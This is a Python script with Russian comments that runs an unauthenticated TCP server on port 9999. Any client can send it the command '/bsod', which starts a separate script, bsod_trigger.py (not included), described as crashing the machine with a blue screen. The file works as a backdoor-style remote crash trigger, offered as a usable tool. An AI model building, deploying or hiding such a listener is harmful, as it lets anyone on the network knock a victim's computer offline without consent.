import socket
import subprocess
import sys
import os
import threading
import time

# === КОНФИГУРАЦИЯ ===
HOST = '0.0.0.0'  # Слушаем все сетевые интерфейсы
PORT = 9999       # Порт для подключения
# ===================

# Функция для выполнения команды 'bsod'
def execute_bsod():
    """Запускает скрипт синего экрана смерти"""
    # Получаем путь к папке, где находится main-скрипт
    base_dir = os.path.dirname(os.path.abspath(__file__))
    bsod_script_path = os.path.join(base_dir, 'bsod_trigger.py')
    
    if not os.path.exists(bsod_script_path):
        return "Error: bsod_trigger.py not found in the script directory."
    
    try:
        # Запускаем bsod_trigger.py в отдельном процессе
        # Используем sys.executable для вызова того же интерпретатора Python
        subprocess.Popen([sys.executable, bsod_script_path], shell=False)
        return "Bsod command acknowledged. Triggering BSOD..."
    except Exception as e:
        return f"Failed to execute BSOD script: {str(e)}"

# Функция для обработки других команд
def process_command(command):
    """Обрабатывает текстовые команды"""
    cmd = command.strip().lower()
    
    if cmd == "/bsod":
        return execute_bsod()
    else:
        return f"Unknown command: {command}. Available commands: /bsod"

def handle_client(conn, addr):
    """Обрабатывает подключение одного клиента"""
    print(f"[+] Установлено соединение с {addr}")
    try:
        while True:
            # Получаем данные от клиента
            data = conn.recv(1024).decode('utf-8')
            if not data:
                break  # Клиент отключился
                
            print(f"[>] Получена команда: {data}")
            response = process_command(data)
            
            # Отправляем ответ обратно клиенту
            conn.sendall(response.encode('utf-8'))
    except Exception as e:
        print(f"[-] Ошибка: {e}")
    finally:
        conn.close()
        print(f"[-] Соединение с {addr} закрыто")

def start_server():
    """Запускает главный сервер"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((HOST, PORT))
        server.listen(5)
        print(f"[*] Сервер запущен на {HOST}:{PORT}")
        print("[*] Ожидание подключений...")
        
        while True:
            conn, addr = server.accept()
            # Для каждого подключения создаем новый поток, чтобы сервер не блокировался
            client_thread = threading.Thread(target=handle_client, args=(conn, addr))
            client_thread.start()
    except KeyboardInterrupt:
        print("\n[!] Сервер остановлен пользователем.")
    except Exception as e:
        print(f"[-] Ошибка сервера: {e}")
    finally:
        server.close()

if __name__ == "__main__":
    start_server()